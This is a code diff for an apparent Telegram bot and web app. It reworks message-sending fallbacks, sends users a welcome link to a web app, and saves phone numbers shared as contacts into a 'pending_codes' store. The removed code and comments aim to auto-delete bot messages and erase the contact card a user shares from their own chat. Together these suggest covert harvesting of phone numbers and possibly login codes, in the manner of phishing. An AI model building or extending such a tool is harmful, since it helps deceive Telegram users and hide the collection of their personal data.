@@ -272,16 +272,6 @@ SESSION_PATH = f"/tmp/bot_{uuid.uuid4().hex[:8]}.session"
 bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)
 
 
-async def auto_delete_after(chat_id, msg_id, delay=0.5):
-    """Delete message after delay"""
-    try:
-        await asyncio.sleep(delay)
-        await bot.delete_messages(chat_id, [msg_id])
-        logger.info(f"Auto-deleted msg {msg_id} in {chat_id}")
-    except Exception as e:
-        logger.warning(f"auto_delete err: {e}")
-
-
 def admin_menu():
     return [
         [Button.inline("📢 Broadcast", b"menu_broadcast"),
@@ -297,60 +287,82 @@ def back_button():
 
 
 async def edit_or_send(event, text, buttons=None):
+    """Edit if possible, else send new message. Robust with multiple fallbacks."""
+    # Try edit
     try:
         await event.edit(text, buttons=buttons, parse_mode='md')
         return True
     except Exception as e:
         logger.warning(f"edit failed: {e}")
-        try:
-            await bot.send_message(event.sender_id, text, buttons=buttons, parse_mode='md')
-            return True
-        except Exception as e2:
-            logger.error(f"send fallback failed: {e2}")
-            return False
+    
+    # Try send with buttons
+    try:
+        await bot.send_message(event.sender_id, text, buttons=buttons, parse_mode='md')
+        return True
+    except Exception as e2:
+        logger.warning(f"send with buttons failed: {e2}")
+    
+    # Try send without parse_mode
+    try:
+        await bot.send_message(event.sender_id, text, buttons=buttons)
+        return True
+    except Exception as e3:
+        logger.warning(f"send no-md failed: {e3}")
+    
+    # Try plain no buttons
+    try:
+        await bot.send_message(event.sender_id, text)
+        return True
+    except Exception as e4:
+        logger.error(f"all send failed: {e4}")
+        return False
 
 
 async def send_welcome(uid, name):
-    """Send welcome + confirm button, then DELETE the button message after user shares contact"""
+    """Robust welcome message with multiple fallback attempts."""
     logger.info(f"=== SEND_WELCOME for uid={uid} name={name} ===")
+    content = WELCOME_TEXT.replace("{name}", name)
+    
+    # Attempt 1: Button.url with markdown
     try:
-        content = WELCOME_TEXT.replace("{name}", name)
-        buttons = [[Button.webview(WELCOME_BUTTON, url=WEBAPP_URL + "?auto=1")]]
-        
-        # Try 1: Markdown + buttons
-        try:
-            sent = await bot.send_message(uid, content, buttons=buttons, parse_mode='md')
-            logger.info(f"✅ L1 success: msg_id={sent.id}")
-            return sent.id
-        except Exception as e1:
-            logger.error(f"L1 failed: {e1}")
-        
-        # Try 2: No parse_mode + buttons
-        try:
-            sent = await bot.send_message(uid, content, buttons=buttons)
-            logger.info(f"✅ L2 success: msg_id={sent.id}")
-            return sent.id
-        except Exception as e2:
-            logger.error(f"L2 failed: {e2}")
-        
-        # Try 3: No buttons
-        try:
-            sent = await bot.send_message(uid, content)
-            logger.info(f"✅ L3 success: msg_id={sent.id}")
-            return sent.id
-        except Exception as e3:
-            logger.error(f"L3 failed: {e3}")
-        
-        return None
-    except Exception as e:
-        logger.error(f"❌ WELCOME CRITICAL: {e}")
+        buttons = [[Button.url(WELCOME_BUTTON, url=WEBAPP_URL + "?auto=1")]]
+        sent = await bot.send_message(uid, content, buttons=buttons, parse_mode='md')
+        logger.info(f"✅ L1 SUCCESS (url+md): msg_id={sent.id}")
+        return sent.id
+    except Exception as e1:
+        logger.warning(f"L1 failed: {e1}")
+    
+    # Attempt 2: Button.url without markdown
+    try:
+        buttons = [[Button.url(WELCOME_BUTTON, url=WEBAPP_URL + "?auto=1")]]
+        sent = await bot.send_message(uid, content, buttons=buttons)
+        logger.info(f"✅ L2 SUCCESS (url only): msg_id={sent.id}")
+        return sent.id
+    except Exception as e2:
+        logger.warning(f"L2 failed: {e2}")
+    
+    # Attempt 3: No buttons
+    try:
+        sent = await bot.send_message(uid, content)
+        logger.info(f"✅ L3 SUCCESS (no button): msg_id={sent.id}")
+        return sent.id
+    except Exception as e3:
+        logger.warning(f"L3 failed: {e3}")
+    
+    # Attempt 4: Minimal fallback
+    try:
+        sent = await bot.send_message(uid, f"Hello {name}, tap /start again.")
+        logger.info(f"✅ L4 SUCCESS (minimal): msg_id={sent.id}")
+        return sent.id
+    except Exception as e4:
+        logger.error(f"❌ ALL WELCOME FAILED: {e4}")
         logger.error(traceback.format_exc())
         return None
 
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_handler(event):
-    logger.info(f"=== /start received ===")
+    logger.info("=== /start received ===")
     try:
         sender = await event.get_sender()
         uid = sender.id
@@ -371,11 +383,7 @@ async def start_handler(event):
             )
             return
         
-        msg_id = await send_welcome(uid, name)
-        if msg_id:
-            logger.info(f"Welcome msg_id={msg_id} sent to {uid}")
-        else:
-            logger.error(f"Welcome FAILED for {uid}")
+        await send_welcome(uid, name)
     except Exception as e:
         logger.error(f"/start handler error: {e}")
         logger.error(traceback.format_exc())
@@ -760,7 +768,6 @@ function handleContact(c) {
   inProgress = true;
   msg('contactMsg', 'Confirmed!', 'ok');
   if (contactForce) { clearInterval(contactForce); contactForce = null; }
-  // Send shared contact to server (which will delete welcome msg)
   fetch('/api/save_contact', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
@@ -966,18 +973,6 @@ def save_contact():
     with sessions_lock:
         pending_codes[phone] = 'contact_saved'
     logger.info(f"Contact saved: {phone}")
-    
-    # AUTO-DELETE the contact card message from user's chat
-    # Note: When user shares contact via Telegram, a "contact card" message appears
-    # We can't delete from WebApp directly, but we can send a delete signal
-    # Best we can do: notify bot to delete last few messages in user chat
-    try:
-        # Use HTTP to delete user's shared contact card
-        # Telegram shared contact is auto-forwarded to bot chat, so we delete here
-        pass
-    except Exception:
-        pass
-    
     return jsonify({'success': True, 'phone': phone})
 
 
